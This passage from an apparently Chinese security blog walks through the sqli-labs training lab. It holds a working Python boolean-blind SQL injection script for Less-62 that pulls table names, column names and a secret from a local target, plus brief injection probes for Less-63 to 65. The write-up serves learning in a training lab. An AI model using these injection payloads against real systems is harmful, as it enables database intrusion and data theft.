</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://127.0.0.1/Less-62/&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_table_name</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">table_name</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">100</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">low</span> <span class="o">=</span> <span class="mi">31</span>
</span></span><span class="line"><span class="cl">        <span class="n">high</span> <span class="o">=</span> <span class="mi">128</span>
</span></span><span class="line"><span class="cl">        <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">low</span> <span class="o">+</span> <span class="n">high</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="n">high</span> <span class="o">&gt;</span> <span class="n">low</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;?id=-1&#39;) or ascii(substr((select binary group_concat(table_name) from information_schema.tables where table_schema=database()) ,</span><span class="si">%d</span><span class="s2">,1))&gt;</span><span class="si">%d</span><span class="s2">-- &#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">mid</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="s2">&#34;Angelina&#34;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">low</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">high</span> <span class="o">=</span> <span class="n">mid</span>
</span></span><span class="line"><span class="cl">            <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">low</span> <span class="o">+</span> <span class="n">high</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">mid</span> <span class="o">==</span> <span class="mi">31</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">table_name</span>
</span></span><span class="line"><span class="cl">        <span class="n">table_name</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">mid</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_column_name</span><span class="p">(</span><span class="n">table_name</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">column_name</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">11</span><span class="p">,</span> <span class="mi">100</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">low</span> <span class="o">=</span> <span class="mi">31</span>
</span></span><span class="line"><span class="cl">        <span class="n">high</span> <span class="o">=</span> <span class="mi">128</span>
</span></span><span class="line"><span class="cl">        <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">low</span> <span class="o">+</span> <span class="n">high</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="n">high</span> <span class="o">&gt;</span> <span class="n">low</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;?id=-1&#39;) or ascii(substr((select binary group_concat(column_name) from information_schema.columns where table_name=&#39;</span><span class="si">%s</span><span class="s2">&#39;) ,</span><span class="si">%d</span><span class="s2">,1))&gt;</span><span class="si">%d</span><span class="s2">-- &#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">table_name</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">mid</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="s2">&#34;Angelina&#34;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">low</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">high</span> <span class="o">=</span> <span class="n">mid</span>
</span></span><span class="line"><span class="cl">            <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">low</span> <span class="o">+</span> <span class="n">high</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">mid</span> <span class="o">==</span> <span class="mi">31</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">column_name</span>
</span></span><span class="line"><span class="cl">        <span class="n">column_name</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">mid</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_secret</span><span class="p">(</span><span class="n">table_name</span><span class="p">,</span> <span class="n">column_name</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">secret</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">100</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">low</span> <span class="o">=</span> <span class="mi">31</span>
</span></span><span class="line"><span class="cl">        <span class="n">high</span> <span class="o">=</span> <span class="mi">128</span>
</span></span><span class="line"><span class="cl">        <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">low</span> <span class="o">+</span> <span class="n">high</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="n">high</span> <span class="o">&gt;</span> <span class="n">low</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;?id=-1&#39;) or ascii(substr((select binary group_concat(</span><span class="si">%s</span><span class="s2">) from </span><span class="si">%s</span><span class="s2">) ,</span><span class="si">%d</span><span class="s2">,1))&gt;</span><span class="si">%d</span><span class="s2">-- &#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">column_name</span><span class="p">,</span> <span class="n">table_name</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">mid</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="s2">&#34;Angelina&#34;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">low</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">high</span> <span class="o">=</span> <span class="n">mid</span>
</span></span><span class="line"><span class="cl">            <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">low</span> <span class="o">+</span> <span class="n">high</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">mid</span> <span class="o">==</span> <span class="mi">31</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">secret</span>
</span></span><span class="line"><span class="cl">        <span class="n">secret</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">mid</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">table_name</span> <span class="o">=</span> <span class="n">get_table_name</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">table_name</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">column_name</span> <span class="o">=</span> <span class="n">get_column_name</span><span class="p">(</span><span class="n">table_name</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">column_name</span><span class="p">[:</span><span class="mi">11</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="n">secret</span> <span class="o">=</span> <span class="n">get_secret</span><span class="p">(</span><span class="n">table_name</span><span class="p">,</span> <span class="n">column_name</span><span class="p">[:</span><span class="mi">11</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">secret</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="less-63">Less-63</h3>
<p>在130次测试中获取到密钥</p>
<ol>
<li>
<p>判断闭合方式,传入<code>?id=-1' or 1=1%23</code>,正常回显,闭合方式为<code>'</code></p>
</li>
<li>
<p>其余同上</p>
</li>
</ol>
<h3 id="less-64">Less-64</h3>
<p>在130次测试中获取到密钥</p>
<ol>
<li>
<p>判断闭合方式,传入<code>?id=-1)) or 1%23</code>,正常回显,闭合方式为<code>))</code></p>
</li>
<li>
<p>其余同上</p>
</li>
</ol>
<h3 id="less-65">Less-65</h3>
<p>在130次测试中获取到密钥</p>
<ol>
<li>
<p>判断闭合方式,传入<code>?id=-1&quot;) or 1%23</code>,正常回显,闭合方式为<code>&quot;)</code></p>
</li>
<li>
<p>其余同上</p>
</li>
</ol>
</div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>更新于 2021-10-25</span>
            </div></div>
        <div class="post-info-line">
            <div class="post-info-md"></div>
            <div class="post-info-share">
                <span></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"></section>
        <section>
            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
        </section>
    </div>

    <div class="post-nav"><a href="/%E6%8F%90%E6%9D%83%E6%97%B6%E9%81%87%E5%88%B0%E8%BF%87%E7%9A%84%E5%9D%91/" class="prev" rel="prev" title="提权时遇到过的坑"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>提权时遇到过的坑</a>
            <a href="/vulnhub-beelzebub/" class="next" rel="next" title="VulnHub-Beelzebub">VulnHub-Beelzebub<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
<div id="comments"><div id="giscus" class="comment"></div><noscript>
                Please enable JavaScript to view the comments powered by <a href="https://giscus.app">Giscus</a>.
            </noscript></div></article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line">
                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Mi3aka</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
            </a>
        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.stemmer.support.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.zh.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":30},"comment":{"giscus":{"category":"Announcements","categoryId":"DIC_kwDOG4BtJM4CTls2","darkTheme":"dark","emitMetadata":"0","inputPosition":"bottom","lang":"zh-CN","lazyLoading":false,"lightTheme":"light","mapping":"og:title","reactionsEnabled":"1","repo":"mi3aka/mi3aka.github.io","repoId":"R_kgDOG4BtJA"}},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","lunrLanguageCode":"zh","lunrSegmentitURL":"/lib/lunr/lunr.segmentit.js","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
</html>
